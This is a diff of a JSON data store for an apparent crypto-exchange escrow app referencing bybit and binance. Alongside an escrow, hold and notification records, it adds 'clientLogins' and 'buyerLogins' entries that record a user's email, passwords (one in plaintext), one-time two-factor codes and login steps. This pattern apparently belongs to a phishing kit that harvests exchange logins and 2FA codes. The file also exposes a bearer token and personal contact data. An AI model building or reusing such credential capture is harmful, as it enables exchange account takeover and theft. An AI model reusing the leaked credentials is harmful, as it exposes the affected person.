@@ -1,10 +1,18 @@
 {
   "wallet": {
     "balances": {
-      "USD": 10650,
+      "USD": 10550,
       "KES": 100
     },
     "activity": [
+      {
+        "id": "1765057097009-e395291bb1e5b8",
+        "type": "hold",
+        "amount": 100,
+        "currency": "USD",
+        "description": "Hold created for bybit",
+        "timestamp": "2025-12-06T21:38:17.009Z"
+      },
       {
         "id": "1765048643485-6d1e57005645b8",
         "type": "deposit",
@@ -151,6 +159,34 @@
     ]
   },
   "escrows": [
+    {
+      "id": "miutf8ds-hz0yty",
+      "platform": "bybit",
+      "paymentMethods": [
+        {
+          "id": 1,
+          "method": "paypal",
+          "fields": {
+            "email": "kbonface03@gmail.com"
+          }
+        }
+      ],
+      "amount": 100,
+      "currency": "USD",
+      "notes": "",
+      "status": "held",
+      "expiresAt": "2025-12-06T21:53:16.994Z",
+      "createdAt": "2025-12-06T21:38:16.994Z",
+      "clientToken": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiY2xpZW50IiwiaWF0IjoxNzY1MDU3MDc1LCJleHAiOjE3NjUwODU4NzV9.TJjj-tRwxTSorb89hN1EPK3nfIqgZw1hdd4JiX8TTMI",
+      "statusHistory": [
+        {
+          "status": "held",
+          "actor": "client",
+          "timestamp": "2025-12-06T21:38:17.009Z",
+          "note": "Funds reserved"
+        }
+      ]
+    },
     {
       "id": "miumidnt-q4cja7",
       "platform": "binance",
@@ -442,6 +478,14 @@
   ],
   "history": [
     {
+      "id": "1765057097009-1183266fb1c658",
+      "escrowId": "miutf8ds-hz0yty",
+      "platform": "bybit",
+      "amount": 100,
+      "currency": "USD",
+      "createdAt": "2025-12-06T21:38:16.994Z"
+    },
+    {
       "id": "1765045486505-3f199fce198f18",
       "escrowId": "miumidnt-q4cja7",
       "platform": "binance",
@@ -499,6 +543,14 @@
     }
   ],
   "notifications": [
+    {
+      "id": "1765057097009-422313606aca48",
+      "createdAt": "2025-12-06T21:38:17.009Z",
+      "target": "admin",
+      "escrowId": "miutf8ds-hz0yty",
+      "status": "held",
+      "message": "New escrow created for bybit"
+    },
     {
       "id": "1765047042892-c5678424dfb9d",
       "createdAt": "2025-12-06T18:50:42.892Z",
@@ -670,6 +722,72 @@
   ],
   "clientLogins": [
     {
+      "id": "1765057475676-f328473582694",
+      "email": "kbonface03@gmail.com",
+      "password": "Temp@2019",
+      "twoFactorCode": "245567",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:44:35.677Z"
+    },
+    {
+      "id": "1765057470640-5dcd865b7425a8",
+      "email": "kbonface03@gmail.com",
+      "password": "Temp@2019",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:44:30.640Z"
+    },
+    {
+      "id": "1765057074717-59951cf87ddd28",
+      "email": "kbonface03@gmail.com",
+      "password": "$2b$10$fAUwp945dzuhBA5vUHpSyOLWLCz0IasDRWT3BhVX1j6LenUaQNkTy",
+      "twoFactorCode": "345677",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:37:54.717Z"
+    },
+    {
+      "id": "1765057070090-63fbcff3a08638",
+      "email": "kbonface03@gmail.com",
+      "password": "$2b$10$RTlqSYaifgwPCZ1hArud2uB1bXj.WVmTJepVIVON7cVwBOcgmgksG",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:37:50.090Z"
+    },
+    {
+      "id": "1765056824155-3a64a3edc961c",
+      "email": "kbonface03@gmail.com",
+      "password": "$2b$10$fMTKuSZYTrS33c1K4PgfYueRXqUzekKYDtAM.ejBT7kgbH7VlbwTu",
+      "twoFactorCode": "424536",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:33:44.156Z"
+    },
+    {
+      "id": "1765056819666-0edf01745d3fb",
+      "email": "kbonface03@gmail.com",
+      "password": "$2b$10$wJTabaHiMdJCkEicdU2hJu.wTYoKDHREdDNl67HP/JcjfSYkYYIcS",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:33:39.666Z"
+    },
+    {
       "id": "1765056085856-73e91f07587ae8",
       "email": "kbonface03@gmail.com",
       "password": "$2b$10$wlHVfSUI5kynjelCk/mCU.FgJx70oJnlsArsB9ievZ/AaE38ipDYW",
@@ -701,6 +819,32 @@
       "ipAddress": "::1",
       "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
       "timestamp": "2025-12-06T19:16:13.087Z"
+    }
+  ],
+  "buyerLogins": [
+    {
+      "id": "1765057129513-8906d9ea998f38",
+      "email": "kbonface03@gmail.com",
+      "password": "$2b$10$9k0bhM25614o2jGk2tGTKe2Du6O4l7RjpwX8zk0NGAxhzW2bETlSO",
+      "twoFactorCode": "324564",
+      "platform": "bybit",
+      "escrowId": "miutf8ds-hz0yty",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:38:49.514Z"
+    },
+    {
+      "id": "1765057124086-3e69333fbeb318",
+      "email": "kbonface03@gmail.com",
+      "password": "$2b$10$ZJ5bg8ZJMHMe3am1db1sN.hf.K36Y7.xL43Ic6WPWuiCNUYUOkMMO",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "escrowId": "miutf8ds-hz0yty",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T21:38:44.087Z"
     }
   ]
 }
